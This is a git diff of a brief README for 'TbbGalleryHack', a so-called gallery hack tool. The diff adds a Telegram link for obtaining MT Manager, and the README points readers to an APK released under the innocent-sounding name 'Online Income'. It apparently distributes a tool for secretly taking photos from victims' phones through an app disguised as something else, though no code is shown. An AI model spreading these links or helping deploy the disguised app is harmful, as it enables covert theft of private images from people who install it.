@@ -1,7 +1,7 @@
 # TbbGalleryHack
 Gallery Hack Form Our Team
 # Setup 
-You need mt manager Download it Form our telegram 
+You need [Mt Manager](https://t.me/TBBSUPORTGROUP/47343) Download it Form our telegram 
 
 Fast down this app [Online Income](https://github.com/TeamBlackBerry/TbbGalleryHack/releases/download/App/Online.Income.apk)
 
